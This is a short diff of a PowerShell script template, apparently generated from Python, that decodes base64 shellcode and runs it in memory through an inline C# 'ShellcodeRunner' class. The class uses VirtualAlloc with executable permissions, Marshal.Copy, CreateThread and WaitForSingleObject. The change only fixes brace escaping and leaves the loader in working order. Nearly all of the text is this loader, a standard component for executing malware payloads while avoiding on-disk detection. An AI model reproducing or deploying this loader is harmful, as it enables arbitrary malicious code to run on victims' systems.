@@ -406,7 +406,7 @@ $sc = [Convert]::FromBase64String('{b64}')
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
-public class ShellcodeRunner {{
+public class ShellcodeRunner {
     [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
@@ -417,13 +417,13 @@ public class ShellcodeRunner {{
     [DllImport("kernel32.dll")]
     public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-    public static void Run(byte[] sc) {{
+    public static void Run(byte[] sc) {
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
         Marshal.Copy(sc, 0, addr, sc.Length);
         IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
         WaitForSingleObject(thread, 0xFFFFFFFF);
-    }}
-}}
+    }
+}
 "@
 
 [ShellcodeRunner]::Run($sc)
